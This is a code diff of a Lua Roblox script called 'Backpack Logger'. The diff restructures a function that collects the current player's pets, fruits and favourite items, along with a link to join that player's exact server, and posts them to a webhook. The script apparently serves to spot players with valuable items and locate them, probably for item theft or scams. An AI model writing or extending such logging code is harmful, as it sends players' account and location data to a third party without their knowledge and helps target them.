@@ -121,23 +121,23 @@ end
 local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
     local userId = LocalPlayer.UserId
     local username = LocalPlayer.Name
-    local fields = {}
+    local allFields = {}
 
     -- P-E-T-S
     if #pets > 0 then
-        table.insert(fields, { name = "Pets", value = " ", inline = false })
+        table.insert(allFields, { name = "Pets", value = " ", inline = false })
         local petNames, petAges, petWeights = parsePets(pets)
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "🐾 Pets",
             value = "```\n" .. table.concat(petNames, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "🧩 Age",
             value = "```\n" .. table.concat(petAges, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "⚖️ Weight",
             value = "```\n" .. table.concat(petWeights, "\n") .. "\n```",
             inline = true
@@ -146,7 +146,7 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
 
     -- F-R-U-I-T-S
     if #fruits > 0 then
-        table.insert(fields, { name = "Fruits", value = " ", inline = false })
+        table.insert(allFields, { name = "Fruits", value = " ", inline = false })
 
         sortFruitsAlphabetically(fruits)
         local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
@@ -158,17 +158,17 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
             table.insert(fruitWeights, "[" .. weight .. "]")
         end
 
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "🍑 Fruits",
             value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "🧩 Mutation",
             value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "⚖️ Weight",
             value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```",
             inline = true
@@ -177,18 +177,18 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
 
     -- F-A-V-O-R-I-T-E-S
     if #favNames > 0 then
-        table.insert(fields, { name = "Favorites", value = " ", inline = false })
-        table.insert(fields, {
+        table.insert(allFields, { name = "Favorites", value = " ", inline = false })
+        table.insert(allFields, {
             name = "⭐ Favorites",
             value = "```\n" .. table.concat(favNames, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "🧩 Mutation / Pet Age",
             value = "```\n" .. table.concat(favMods, "\n") .. "\n```",
             inline = true
         })
-        table.insert(fields, {
+        table.insert(allFields, {
             name = "⚖️ Weight",
             value = "```\n" .. table.concat(favWeights, "\n") .. "\n```",
             inline = true
@@ -197,16 +197,26 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
 
     local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)
 
-    local payload = {
-        username = "Backpack Logger",
-        embeds = { {
+    -- Split fields into multiple embeds if needed
+    local embeds = {}
+    for i = 1, #allFields, 25 do
+        local embedFields = {}
+        for j = i, math.min(i + 24, #allFields) do
+            table.insert(embedFields, allFields[j])
+        end
+        table.insert(embeds, {
             title = username .. "'s Backpack Inventory",
             url = "https://www.roblox.com/users/" .. userId .. "/profile",
             color = 0x00BFFF,
             description = joinLink,
-            fields = fields,
+            fields = embedFields,
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        } }
+        })
+    end
+
+    local payload = {
+        username = "Backpack Logger",
+        embeds = embeds
     }
 
     local response = safeRequest({
